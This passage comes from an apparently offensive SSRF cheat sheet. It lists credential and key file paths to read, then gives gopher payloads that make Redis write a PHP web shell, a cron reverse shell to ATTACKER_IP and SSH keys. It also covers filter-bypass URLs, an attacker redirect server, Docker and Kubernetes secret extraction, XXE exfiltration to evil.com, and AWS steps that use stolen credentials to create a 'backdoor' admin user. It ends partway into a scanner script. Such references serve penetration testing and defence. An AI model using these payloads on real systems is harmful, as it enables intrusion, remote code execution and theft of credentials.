file:///home/user/.ssh/id_rsa
file:///home/user/.ssh/authorized_keys
file:///home/user/.bash_history
file:///root/.ssh/id_rsa
file:///root/.bash_history
```

```text [Credentials & Secrets]
file:///etc/mysql/debian.cnf
file:///etc/redis/redis.conf
file:///etc/postgresql/pg_hba.conf
file:///var/lib/jenkins/secrets/master.key
file:///var/lib/jenkins/secrets/initialAdminPassword
file:///root/.docker/config.json
file:///root/.aws/credentials
file:///root/.aws/config
file:///home/user/.aws/credentials
file:///root/.kube/config
```

```text [Windows Files]
file:///C:/Windows/win.ini
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/Windows/System32/config/SAM
file:///C:/inetpub/wwwroot/web.config
file:///C:/Users/Administrator/.ssh/id_rsa
```

```text [Kubernetes Secrets via File]
file:///var/run/secrets/kubernetes.io/serviceaccount/token
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
```

```text [Docker Secrets]
file:///proc/1/environ
file:///run/secrets/db_password
file:///run/secrets/api_key
```

```text [Cloud Credential Files]
file:///root/.aws/credentials
file:///root/.gcp/credentials.json
file:///home/user/.config/gcloud/credentials.db
file:///home/user/.azure/accessTokens.json
file:///home/user/.azure/azureProfile.json
```
::

::collapsible
---
label: "gopher:// — Arbitrary TCP Protocol Interaction"
---

The `gopher://` protocol allows sending **arbitrary data** to any TCP port. This enables interaction with services that use non-HTTP protocols: Redis, Memcached, MySQL, SMTP, FastCGI, etc.

**Gopher URL format:**
```text
gopher://HOST:PORT/_RAW_TCP_DATA
```

Characters must be URL-encoded. CRLF is `%0d%0a`.

```text [Redis — INFO Command]
gopher://127.0.0.1:6379/_INFO%0d%0a
```

```text [Redis — Get All Keys]
gopher://127.0.0.1:6379/_KEYS%20*%0d%0a
```

```text [Redis — Read Key Value]
gopher://127.0.0.1:6379/_GET%20secret_key%0d%0a
```

```text [Redis — Write Web Shell]
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html/%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0aSET%20payload%20"<?php%20system($_GET['cmd']);%20?>"%0d%0aSAVE%0d%0a
```

```text [Redis — Reverse Shell via Cron]
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/spool/cron/crontabs/%0d%0aCONFIG%20SET%20dbfilename%20root%0d%0aSET%20payload%20"%0a*%20*%20*%20*%20*%20bash%20-i%20>%26%20/dev/tcp/ATTACKER_IP/4444%200>%261%0a"%0d%0aSAVE%0d%0a
```

```text [Redis — SSH Key Write]
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/root/.ssh/%0d%0aCONFIG%20SET%20dbfilename%20authorized_keys%0d%0aSET%20payload%20"%0a%0assh-rsa%20AAAA...YOUR_PUBLIC_KEY...%20attacker@host%0a%0a"%0d%0aSAVE%0d%0a
```

```text [Memcached — Stats]
gopher://127.0.0.1:11211/_stats%0d%0a
```

```text [Memcached — Get Key]
gopher://127.0.0.1:11211/_get%20session_admin%0d%0a
```

```text [Memcached — Set Key (Session Injection)]
gopher://127.0.0.1:11211/_set%20session_attacker%200%20900%2050%0d%0a{"user":"admin","role":"administrator","id":1}%0d%0a
```

```text [MySQL — Query (requires no password)]
gopher://127.0.0.1:3306/_MYSQL_PACKET_DATA
# Use gopherus tool to generate MySQL packets
```

```text [SMTP — Send Email]
gopher://127.0.0.1:25/_HELO%20attacker.com%0d%0aMAIL%20FROM:<attacker@evil.com>%0d%0aRCPT%20TO:<admin@target.com>%0d%0aDATA%0d%0aFrom:attacker@evil.com%0d%0aTo:admin@target.com%0d%0aSubject:SSRF%20Test%0d%0a%0d%0aThis%20email%20sent%20via%20SSRF%0d%0a.%0d%0aQUIT%0d%0a
```

```text [FastCGI — PHP Code Execution]
# Use gopherus tool to generate FastCGI payload
gopher://127.0.0.1:9000/_FASTCGI_PACKET_DATA
```

```text [PostgreSQL — Query]
# Use gopherus tool to generate PostgreSQL packets
gopher://127.0.0.1:5432/_POSTGRESQL_PACKET_DATA
```

::tip
Use the **Gopherus** tool to automatically generate gopher payloads for Redis, MySQL, PostgreSQL, FastCGI, SMTP, and other protocols.

```bash
python gopherus.py --exploit redis
python gopherus.py --exploit mysql
python gopherus.py --exploit fastcgi
python gopherus.py --exploit smtp
python gopherus.py --exploit postgresql
```
::
::

::collapsible
---
label: "dict:// — Service Banner Grabbing"
---

```text [Redis Banner]
dict://127.0.0.1:6379/INFO
```

```text [Redis Config]
dict://127.0.0.1:6379/CONFIG GET *
```

```text [Service Detection]
dict://127.0.0.1:22/
dict://127.0.0.1:25/
dict://127.0.0.1:3306/
dict://127.0.0.1:5432/
dict://127.0.0.1:6379/
dict://127.0.0.1:11211/
```

```text [Redis Command Execution via dict]
dict://127.0.0.1:6379/SET:payload:"<?php system($_GET['cmd']); ?>"
dict://127.0.0.1:6379/CONFIG:SET:dir:/var/www/html/
dict://127.0.0.1:6379/CONFIG:SET:dbfilename:shell.php
dict://127.0.0.1:6379/SAVE
```
::

::collapsible
---
label: "Other Protocol Payloads"
---

```text [FTP — File Read]
ftp://127.0.0.1/etc/passwd
ftp://anonymous:anonymous@127.0.0.1/
```

```text [TFTP]
tftp://127.0.0.1/etc/passwd
```

```text [LDAP]
ldap://127.0.0.1:389/
ldap://127.0.0.1:389/dc=target,dc=com
```

```text [SSH — Banner Grab]
http://127.0.0.1:22
# Response will contain SSH banner: SSH-2.0-OpenSSH_8.x
```

```text [SMB — Windows]
\\127.0.0.1\C$\Windows\win.ini
file:///\\127.0.0.1\C$\Windows\win.ini
```

```text [Jar Protocol (Java) — Temp File Write]
jar:http://ATTACKER_IP/evil.jar!/
```

```text [netdoc:// (Java)]
netdoc:///etc/passwd
```

```text [expect:// (PHP with expect extension)]
expect://id
expect://whoami
expect://cat /etc/passwd
```

```text [php:// (PHP Wrappers)]
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/read=string.rot13/resource=/etc/passwd
```
::

### Filter Bypass Payloads

::collapsible
---
label: "IP Address Encoding Bypass"
---

```text [Decimal — 127.0.0.1]
http://2130706433
```

```text [Hex — 127.0.0.1]
http://0x7f000001
```

```text [Hex Dotted — 127.0.0.1]
http://0x7f.0x0.0x0.0x1
```

```text [Octal — 127.0.0.1]
http://0177.0.0.1
```

```text [Octal Full — 127.0.0.1]
http://0177.0000.0000.0001
```

```text [Mixed Notation — 127.0.0.1]
http://0x7f.0.0.1
http://0177.0.0.0x1
http://0x7f.0.0.01
```

```text [Decimal — 169.254.169.254]
http://2852039166
```

```text [Hex — 169.254.169.254]
http://0xa9fea9fe
```

```text [Octal — 169.254.169.254]
http://0251.0376.0251.0376
```

```text [IPv6 Mapped — 127.0.0.1]
http://[::ffff:127.0.0.1]
http://[::ffff:7f00:1]
```

```text [IPv6 Mapped — 169.254.169.254]
http://[::ffff:169.254.169.254]
http://[::ffff:a9fe:a9fe]
```

```text [IPv6 Expanded]
http://[0:0:0:0:0:ffff:127.0.0.1]
http://[0000:0000:0000:0000:0000:ffff:7f00:0001]
```

```text [Overflow / Padding]
http://127.0.0.1.0
http://127.0.0.01
http://127.0.00.1
http://0127.0.0.1
```
::

::collapsible
---
label: "Domain-Based Bypass"
---

```text [DNS Wildcard Services]
http://127.0.0.1.nip.io
http://127.0.0.1.sslip.io
http://127.0.0.1.xip.io
http://169.254.169.254.nip.io
http://10.0.0.1.nip.io
http://a]b]c]d.127.0.0.1.nip.io
```

```text [Attacker-Controlled DNS (Resolves to 127.0.0.1)]
# Set A record for evil.com → 127.0.0.1
http://evil.com
http://internal.evil.com
http://metadata.evil.com
```

```text [DNS Rebinding]
# Domain alternates between attacker IP and target IP
# First resolution: 1.2.3.4 (passes validation)
# Second resolution: 127.0.0.1 (actual request)
http://rbndr.us/dfd8d8e8
http://A.1.2.3.4.1time.127.0.0.1.forever.rebind.network
```

```text [Localhost Aliases]
http://localtest.me
http://customer1.app.localhost
http://127.0.0.1.lcl.host
http://loopback
```

```text [Short URL Services]
# Create short URL pointing to internal target
http://tinyurl.com/XXXX → http://169.254.169.254/
http://bit.ly/XXXX → http://127.0.0.1/admin
```

```text [Redirect-Based Bypass]
# Attacker's server redirects to internal target
http://evil.com/redirect → 302 → http://169.254.169.254/
http://evil.com/redirect → 302 → file:///etc/passwd
http://evil.com/redirect → 302 → gopher://127.0.0.1:6379/_INFO
```
::

::collapsible
---
label: "URL Encoding & Parsing Bypass"
---

```text [URL-Encoded IP]
http://%31%32%37%2e%30%2e%30%2e%31
```

```text [Double URL-Encoded]
http://%2531%2532%2537%252e%2530%252e%2530%252e%2531
```

```text [@ Symbol — Credential Bypass]
http://attacker.com@127.0.0.1
http://google.com@127.0.0.1
http://legitimate.com@169.254.169.254
```

```text [Fragment Bypass]
http://evil.com#@127.0.0.1
http://127.0.0.1#.evil.com
```

```text [Backslash Bypass]
http://127.0.0.1\@evil.com
http://evil.com\@127.0.0.1
```

```text [Tab/Newline in URL]
http://127.0.0.%091
http://127.0.0.%0a1
http://127.0.%0d0.1
```

```text [URL with Port]
http://evil.com:80@127.0.0.1/
http://evil.com:443@127.0.0.1/
```

```text [Protocol Case Variation]
HTTP://127.0.0.1
Http://127.0.0.1
hTtP://127.0.0.1
```

```text [Protocol with Whitespace]
http://127.0.0.1
http ://127.0.0.1
http:// 127.0.0.1
```

```text [Rare URL Components]
http://127.0.0.1:80#fragment
http://127.0.0.1:80?query
http://user:pass@127.0.0.1/
http://127.0.0.1/path/..
http://127.0.0.1/./
```
::

::collapsible
---
label: "Redirect-Based Bypass (Follow Redirects)"
---

When the SSRF filter validates the initial URL but the HTTP client follows redirects, the attacker's server can redirect to internal targets.

```python [Attacker's Redirect Server]
from flask import Flask, redirect

app = Flask(__name__)

@app.route('/redirect-ssrf')
def ssrf_redirect():
    # Redirect to cloud metadata
    return redirect('http://169.254.169.254/latest/meta-data/', code=302)

@app.route('/redirect-file')
def file_redirect():
    # Redirect to file protocol
    return redirect('file:///etc/passwd', code=302)

@app.route('/redirect-gopher')
def gopher_redirect():
    # Redirect to gopher (Redis RCE)
    return redirect('gopher://127.0.0.1:6379/_INFO%0d%0a', code=302)

@app.route('/redirect-internal')
def internal_redirect():
    return redirect('http://10.0.0.5:8080/admin/', code=302)

app.run(host='0.0.0.0', port=8080)
```

```text [Redirect Chain Payloads]
http://evil.com/redirect-ssrf
http://evil.com/redirect-file
http://evil.com/redirect-gopher
http://evil.com/redirect-internal
```

```text [Multiple Redirect Chains]
http://evil.com/r1 → http://evil.com/r2 → http://evil.com/r3 → http://169.254.169.254/
# Some filters only check the first redirect destination
```

```text [HTTPS → HTTP Downgrade Redirect]
https://evil.com/redirect → http://169.254.169.254/
# Filter allows HTTPS, redirect downgrades to HTTP
```

```text [Open Redirect on Trusted Domain]
https://trusted-app.com/redirect?url=http://169.254.169.254/
# Filter allows trusted-app.com
# Open redirect bounces to metadata
```
::

::collapsible
---
label: "Request Smuggling via SSRF"
---

```text [CRLF Injection in URL]
http://127.0.0.1%0d%0aHost:%20internal-admin.target.com%0d%0a
```

```text [HTTP Request Splitting]
http://127.0.0.1/ HTTP/1.1%0d%0aHost: internal.target.com%0d%0a%0d%0aGET /admin HTTP/1.1%0d%0aHost: internal.target.com%0d%0a
```

```text [Absolute URL with Host Override]
http://127.0.0.1/
Host: internal-admin.target.com
```
::

### Internal Service Exploitation

::collapsible
---
label: "Redis Exploitation via SSRF"
---

```text [Redis — Information Gathering]
gopher://127.0.0.1:6379/_INFO%0d%0a
gopher://127.0.0.1:6379/_CONFIG%20GET%20*%0d%0a
gopher://127.0.0.1:6379/_CLIENT%20LIST%0d%0a
gopher://127.0.0.1:6379/_DBSIZE%0d%0a
gopher://127.0.0.1:6379/_KEYS%20*%0d%0a
```

```text [Redis — RCE via Web Shell]
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html/%0d%0aCONFIG%20SET%20dbfilename%20shell.php%0d%0aSET%20x%20"<?php%20system($_GET['cmd']);?>"%0d%0aSAVE%0d%0aQUIT%0d%0a
```

```text [Redis — RCE via Crontab]
gopher://127.0.0.1:6379/_FLUSHALL%0d%0aCONFIG%20SET%20dir%20/var/spool/cron/crontabs/%0d%0aCONFIG%20SET%20dbfilename%20root%0d%0aSET%20x%20"%5Cn%5Cn*%20*%20*%20*%20*%20/bin/bash%20-i%20>%26%20/dev/tcp/ATTACKER_IP/4444%200>%261%5Cn%5Cn"%0d%0aSAVE%0d%0aQUIT%0d%0a
```

```text [Redis — SSH Authorized Keys]
gopher://127.0.0.1:6379/_FLUSHALL%0d%0aCONFIG%20SET%20dir%20/root/.ssh/%0d%0aCONFIG%20SET%20dbfilename%20authorized_keys%0d%0aSET%20x%20"%5Cn%5Cnssh-rsa%20AAAA...KEY...%20attacker@host%5Cn%5Cn"%0d%0aSAVE%0d%0aQUIT%0d%0a
```

```text [Redis — Module Load (RCE)]
gopher://127.0.0.1:6379/_MODULE%20LOAD%20/tmp/evil.so%0d%0a
gopher://127.0.0.1:6379/_system.exec%20"id"%0d%0a
```
::

::collapsible
---
label: "Elasticsearch Exploitation via SSRF"
---

```text [Elasticsearch — Cluster Info]
http://127.0.0.1:9200/
http://127.0.0.1:9200/_cluster/health
http://127.0.0.1:9200/_cluster/stats
http://127.0.0.1:9200/_nodes
http://127.0.0.1:9200/_cat/indices
http://127.0.0.1:9200/_cat/nodes
```

```text [Elasticsearch — Data Extraction]
http://127.0.0.1:9200/_all/_search?q=*
http://127.0.0.1:9200/_all/_search?q=password
http://127.0.0.1:9200/_all/_search?q=secret
http://127.0.0.1:9200/_all/_search?q=api_key
http://127.0.0.1:9200/users/_search?q=*
http://127.0.0.1:9200/customers/_search?q=*
http://127.0.0.1:9200/orders/_search?q=*
```

```text [Elasticsearch — Index Listing]
http://127.0.0.1:9200/_cat/indices?v
http://127.0.0.1:9200/_mapping
http://127.0.0.1:9200/_aliases
```

```text [Elasticsearch — Dangerous Operations]
http://127.0.0.1:9200/_shutdown
http://127.0.0.1:9200/INDEX_NAME/_delete_by_query?q=*
```
::

::collapsible
---
label: "Docker API Exploitation via SSRF"
---

```text [Docker — Information]
http://127.0.0.1:2375/version
http://127.0.0.1:2375/info
http://127.0.0.1:2375/images/json
http://127.0.0.1:2375/containers/json
http://127.0.0.1:2375/containers/json?all=true
http://127.0.0.1:2375/networks
http://127.0.0.1:2375/volumes
```

```text [Docker — RCE via Container Creation]
# Step 1: Create container with host mount
POST http://127.0.0.1:2375/containers/create
Content-Type: application/json

{
  "Image": "alpine",
  "Cmd": ["/bin/sh", "-c", "cat /host/etc/shadow"],
  "Binds": ["/:/host"],
  "HostConfig": {
    "Binds": ["/:/host"],
    "Privileged": true
  }
}

# Step 2: Start container
POST http://127.0.0.1:2375/containers/CONTAINER_ID/start

# Step 3: Read output
GET http://127.0.0.1:2375/containers/CONTAINER_ID/logs?stdout=true
```

```text [Docker — Image Inspection]
http://127.0.0.1:2375/images/IMAGE_ID/json
# May reveal environment variables with secrets
```
::

::collapsible
---
label: "Kubernetes API Exploitation via SSRF"
---

```text [Kubernetes — API Discovery]
https://kubernetes.default.svc/api
https://kubernetes.default.svc/api/v1
https://kubernetes.default.svc/apis
https://kubernetes.default.svc/version
https://kubernetes.default.svc/healthz
```

```text [Kubernetes — Namespace & Pod Enumeration]
https://kubernetes.default.svc/api/v1/namespaces
https://kubernetes.default.svc/api/v1/pods
https://kubernetes.default.svc/api/v1/pods?fieldSelector=metadata.namespace=default
```

```text [Kubernetes — Secrets (CRITICAL)]
https://kubernetes.default.svc/api/v1/secrets
https://kubernetes.default.svc/api/v1/namespaces/default/secrets
https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets
```

```text [Kubernetes — ConfigMaps]
https://kubernetes.default.svc/api/v1/configmaps
https://kubernetes.default.svc/api/v1/namespaces/default/configmaps
```

```text [Kubernetes — Service Accounts]
https://kubernetes.default.svc/api/v1/serviceaccounts
```

```text [Kubelet API (if exposed)]
https://NODE_IP:10250/pods
https://NODE_IP:10250/run/NAMESPACE/POD/CONTAINER
https://NODE_IP:10255/pods
```
::

::collapsible
---
label: "Other Internal Services via SSRF"
---

```text [CouchDB]
http://127.0.0.1:5984/
http://127.0.0.1:5984/_all_dbs
http://127.0.0.1:5984/_users/_all_docs
http://127.0.0.1:5984/DATABASE_NAME/_all_docs?include_docs=true
```

```text [MongoDB (HTTP interface)]
http://127.0.0.1:28017/
http://127.0.0.1:28017/serverStatus
```

```text [Consul]
http://127.0.0.1:8500/v1/agent/members
http://127.0.0.1:8500/v1/catalog/services
http://127.0.0.1:8500/v1/kv/?recurse
http://127.0.0.1:8500/v1/agent/self
```

```text [Vault (HashiCorp)]
http://127.0.0.1:8200/v1/sys/health
http://127.0.0.1:8200/v1/sys/seal-status
http://127.0.0.1:8200/v1/secret/data/
```

```text [Jenkins]
http://127.0.0.1:8080/
http://127.0.0.1:8080/script
http://127.0.0.1:8080/api/json
http://127.0.0.1:8080/credentials/
```

```text [Prometheus]
http://127.0.0.1:9090/api/v1/targets
http://127.0.0.1:9090/api/v1/query?query=up
http://127.0.0.1:9090/api/v1/status/config
```

```text [Grafana]
http://127.0.0.1:3000/api/org
http://127.0.0.1:3000/api/datasources
http://127.0.0.1:3000/api/admin/settings
```

```text [RabbitMQ Management]
http://127.0.0.1:15672/api/overview
http://127.0.0.1:15672/api/users
http://127.0.0.1:15672/api/connections
```

```text [Solr]
http://127.0.0.1:8983/solr/admin/info/system
http://127.0.0.1:8983/solr/admin/cores
```

```text [Apache Spark]
http://127.0.0.1:4040/api/v1/applications
http://127.0.0.1:8088/ws/v1/cluster/apps
```

```text [Hadoop]
http://127.0.0.1:50070/jmx
http://127.0.0.1:50070/webhdfs/v1/?op=LISTSTATUS
```
::

---

## Blind SSRF Exploitation

::note
Blind SSRF is more common than basic SSRF. The server makes the request but **does not return the response content**. Exploitation requires indirect techniques to extract information or achieve impact.
::

### Blind SSRF Detection

::collapsible
---
label: "Confirming Blind SSRF"
---

```text [DNS-Based Confirmation]
http://UNIQUE_ID.YOUR_DNS_SERVER.com
# Check DNS logs for resolution from target server IP
```

```text [HTTP Callback Confirmation]
http://YOUR_COLLABORATOR_DOMAIN/ssrf-test
# Check HTTP access logs for request from target server
```

```text [Timing-Based Confirmation]
# Open port — fast response (< 1s)
http://127.0.0.1:80

# Closed port — slow response (timeout, ~5-30s)
http://127.0.0.1:1

# Compare response times to confirm SSRF
```

```text [Error-Based Confirmation]
# Valid URL — no error
http://example.com

# Invalid/unreachable URL — different error
http://this-domain-does-not-exist-12345.com

# Internal IP — different error again
http://10.0.0.1

# If error messages differ, SSRF is confirmed
```

```python [Automated Blind SSRF Detection]
import requests
import time

TARGET = "http://target.com/fetch"
COLLABORATOR = "YOUR_UNIQUE_ID.burpcollaborator.net"

# Test with collaborator
resp = requests.get(f"{TARGET}?url=http://{COLLABORATOR}/test")
print(f"Response: {resp.status_code}")

# Timing-based port scan
for port in [22, 80, 443, 3306, 6379, 8080, 9200]:
    start = time.time()
    try:
        requests.get(f"{TARGET}?url=http://127.0.0.1:{port}", timeout=10)
    except:
        pass
    elapsed = time.time() - start
    status = "OPEN" if elapsed < 3 else "CLOSED/FILTERED"
    print(f"Port {port}: {elapsed:.2f}s — {status}")
```
::

### Blind SSRF Exploitation Techniques

::collapsible
---
label: "Out-of-Band Data Exfiltration"
---

```text [Exfiltrate via DNS]
# If SSRF processes response and uses content in DNS lookup:
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# If the response (credentials) is reflected in any DNS query or HTTP callback
```

```text [Exfiltrate via HTTP Callback (Redirect Chain)]
# Step 1: SSRF fetches attacker URL
http://evil.com/exfil

# Step 2: Attacker server reads response headers/body from SSRF
# Step 3: Redirect to next internal target
```

```text [Webhook Data Exfiltration]
# If the SSRF is in a webhook feature:
# The server POSTs data to the attacker's URL
# Set webhook URL to attacker's server
# Receive internal data in webhook payload
```

```python [Blind SSRF — Internal Network Scanner]
import requests
import time

TARGET = "http://target.com/preview"
TIMEOUT_THRESHOLD = 3  # seconds

# Scan internal /24 subnet
for i in range(1, 255):
    ip = f"10.0.0.{i}"
    start = time.time()
    try:
        requests.get(f"{TARGET}?url=http://{ip}/", timeout=5)
    except:
        pass
    elapsed = time.time() - start
    
    if elapsed < TIMEOUT_THRESHOLD:
        print(f"[+] {ip} — ALIVE (responded in {elapsed:.2f}s)")
```
::

---

## DNS Rebinding Attack

DNS rebinding is an advanced technique to bypass SSRF filters that validate the resolved IP address **before** making the request.

::steps{level="4"}

#### How DNS Rebinding Works

```text
1. Attacker submits URL: http://evil.com/
2. Application resolves evil.com → 1.2.3.4 (attacker's IP) — passes validation ✅
3. Application makes HTTP request to evil.com
4. DNS resolution happens AGAIN (or TTL expires)
5. evil.com now resolves to → 127.0.0.1 (internal target) 💀
6. Request goes to 127.0.0.1 instead of 1.2.3.4
```

The key: the DNS record for the attacker's domain **changes between validation and use**.

#### Set Up DNS Rebinding

```python [DNS Rebinding Server]
# Use rbndr.us service
# URL format: http://A.B.C.D.1time.E.F.G.H.forever.rebind.network
# First resolution: A.B.C.D
# Subsequent resolutions: E.F.G.H

http://1.2.3.4.1time.127.0.0.1.forever.rebind.network
# First DNS query → 1.2.3.4 (passes filter)
# Second DNS query → 127.0.0.1 (targets localhost)
```

```text [Custom Rebinding Server]
# Use singularity of origin
# https://github.com/nccgroup/singularity

# Or use rbndr
# https://github.com/taviso/rbndr
```

#### Submit Rebinding URL

```http
GET /fetch?url=http://1.2.3.4.1time.127.0.0.1.forever.rebind.network/latest/meta-data/ HTTP/1.1
Host: target.com
```

#### Application Validates and Fetches

The application validates the first resolution (attacker's IP) as safe, but the actual HTTP request goes to the second resolution (127.0.0.1).

::

---

## SSRF via File Formats

### SVG File SSRF

::collapsible
---
label: "SVG-Based SSRF Payloads"
---

```xml [SVG — External Image Fetch]
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
  <image xlink:href="http://169.254.169.254/latest/meta-data/" width="100" height="100"/>
</svg>
```

```xml [SVG — External Stylesheet]
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <style>
    @import url('http://169.254.169.254/latest/meta-data/');
  </style>
  <circle cx="50" cy="50" r="40"/>
</svg>
```

```xml [SVG — foreignObject with iframe]
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg">
  <foreignObject width="100" height="100">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <iframe src="http://169.254.169.254/latest/meta-data/"/>
    </body>
  </foreignObject>
</svg>
```

```xml [SVG — Entity-Based SSRF (XXE)]
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

```xml [SVG — File Read]
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="20">&xxe;</text>
</svg>
```
::

### XML-Based SSRF (XXE)

::collapsible
---
label: "XXE → SSRF Payloads"
---

```xml [Basic XXE → SSRF]
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>
```

```xml [XXE → File Read]
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

```xml [XXE → SSRF via External DTD]
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">
  %dtd;
]>
<root>&exfil;</root>
```

```xml [xxe.dtd — External DTD for OOB Exfiltration]
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % wrapper "<!ENTITY exfil SYSTEM 'http://evil.com/?d=%data;'>">
%wrapper;
```

```xml [XXE → SSRF via SOAP]
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
  <soapenv:Body>
    <foo>
      <!DOCTYPE test [
        <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
      ]>
      <bar>&xxe;</bar>
    </foo>
  </soapenv:Body>
</soapenv:Envelope>
```
::

### PDF Generator SSRF

::collapsible
---
label: "HTML-to-PDF SSRF Payloads"
---

```html [PDF — Iframe SSRF]
<html>
<body>
<iframe src="http://169.254.169.254/latest/meta-data/" width="100%" height="500">
</iframe>
</body>
</html>
```

```html [PDF — Image SSRF]
<html>
<body>
<img src="http://169.254.169.254/latest/meta-data/">
<img src="file:///etc/passwd">
</body>
</html>
```

```html [PDF — CSS Import SSRF]
<html>
<head>
<style>
@import url('http://169.254.169.254/latest/meta-data/');
</style>
</head>
<body>Test</body>
</html>
```

```html [PDF — JavaScript Fetch SSRF]
<html>
<body>
<script>
var x = new XMLHttpRequest();
x.open("GET", "http://169.254.169.254/latest/meta-data/", false);
x.send();
document.write(x.responseText);
</script>
</body>
</html>
```

```html [PDF — Link Header SSRF]
<html>
<head>
<link rel="stylesheet" href="http://169.254.169.254/latest/meta-data/">
</head>
<body>Test</body>
</html>
```

```html [PDF — Embed / Object SSRF]
<html>
<body>
<embed src="http://169.254.169.254/latest/meta-data/">
<object data="http://169.254.169.254/latest/meta-data/"></object>
</body>
</html>
```

```html [PDF — File Read]
<html>
<body>
<iframe src="file:///etc/passwd"></iframe>
<script>
x = new XMLHttpRequest();
x.open("GET","file:///etc/passwd",false);
x.send();
document.write("<pre>" + x.responseText + "</pre>");
</script>
</body>
</html>
```
::

---

## Privilege Escalation via SSRF

::card-group
  ::card
  ---
  title: "Cloud Credential Theft → Cloud Takeover"
  icon: i-lucide-cloud
  ---
  Extract IAM credentials from cloud metadata. Use stolen `AccessKeyId`, `SecretAccessKey`, and `Token` to access S3 buckets, EC2 instances, RDS databases, Lambda functions, and any other AWS service the role has access to. Full cloud account compromise.
  ::

  ::card
  ---
  title: "Internal Admin Panel Access"
  icon: i-lucide-layout-dashboard
  ---
  Access internal admin interfaces (Jenkins, Grafana, Kibana, Consul) that are protected only by network segmentation. These often have default credentials or no authentication when accessed from internal IPs.
  ::

  ::card
  ---
  title: "Redis/Memcached → RCE"
  icon: i-lucide-terminal
  ---
  Write web shells, cron jobs, or SSH keys through unauthenticated Redis instances via gopher protocol. Inject serialized objects into Memcached session stores. Achieve remote code execution on the server.
  ::

  ::card
  ---
  title: "Kubernetes Secrets → Cluster Takeover"
  icon: i-lucide-container
  ---
  Read Kubernetes secrets containing database passwords, API keys, and TLS certificates. Access the Kubernetes API to create privileged pods, escalate to cluster-admin, and take over the entire cluster.
  ::

  ::card
  ---
  title: "Docker API → Host Escape"
  icon: i-lucide-box
  ---
  Create privileged containers with host filesystem mounted via the Docker API. Read `/etc/shadow`, write SSH keys, or install rootkits on the host system.
  ::

  ::card
  ---
  title: "Database Direct Access"
  icon: i-lucide-database
  ---
  Connect to internal databases (MySQL, PostgreSQL, MongoDB) that trust connections from internal IPs. Extract sensitive data, create admin accounts, or modify data.
  ::

  ::card
  ---
  title: "Network Pivot → Lateral Movement"
  icon: i-lucide-network
  ---
  Use SSRF as a pivot point to scan and access other internal networks, VPCs, or segmented environments. Chain SSRF to reach multi-tier architectures.
  ::

  ::card
  ---
  title: "File Read → Credential Harvesting"
  icon: i-lucide-file-key
  ---
  Read configuration files, `.env` files, SSH keys, AWS credentials files, and application configs via `file://` protocol. Use extracted credentials for direct access.
  ::
::

### AWS Credential Theft → Full Exploitation

::steps{level="4"}

#### Extract IAM Role Name

```http
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: target.com

# Response: my-ec2-role
```

#### Extract IAM Credentials

```http
GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/my-ec2-role HTTP/1.1
Host: target.com

# Response:
# {
#   "AccessKeyId": "ASIAXXXXXXXXXXX",
#   "SecretAccessKey": "XXXXXXXXXXXXXXXXXXXXXXXX",
#   "Token": "FwoGZXIvYXdzE...",
#   "Expiration": "2024-12-31T23:59:59Z"
# }
```

#### Configure AWS CLI with Stolen Credentials

```bash
export AWS_ACCESS_KEY_ID="ASIAXXXXXXXXXXX"
export AWS_SECRET_ACCESS_KEY="XXXXXXXXXXXXXXXXXXXXXXXX"
export AWS_SESSION_TOKEN="FwoGZXIvYXdzE..."

# Verify identity
aws sts get-caller-identity
```

#### Enumerate Permissions and Escalate

```bash
# List S3 buckets
aws s3 ls

# List EC2 instances
aws ec2 describe-instances

# List Lambda functions
aws lambda list-functions

# List RDS databases
aws rds describe-db-instances

# List Secrets Manager secrets
aws secretsmanager list-secrets

# Read specific secret
aws secretsmanager get-secret-value --secret-id prod/database/credentials

# List IAM users and roles
aws iam list-users
aws iam list-roles

# Attempt to create new admin user
aws iam create-user --user-name backdoor
aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backdoor
```

::

---

## Automation & Tooling

### SSRF Scanner Script

::collapsible
---
label: "Python SSRF Scanner"
---

```python [ssrf_scanner.py]
#!/usr/bin/env python3
"""
SSRF Vulnerability Scanner
Tests multiple bypass techniques and internal targets.
"""

import requests
import time
import sys
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings
warnings.filterwarnings('ignore')

# === CONFIGURATION ===
TARGET_URL = "http://target.com/fetch"
PARAM_NAME = "url"
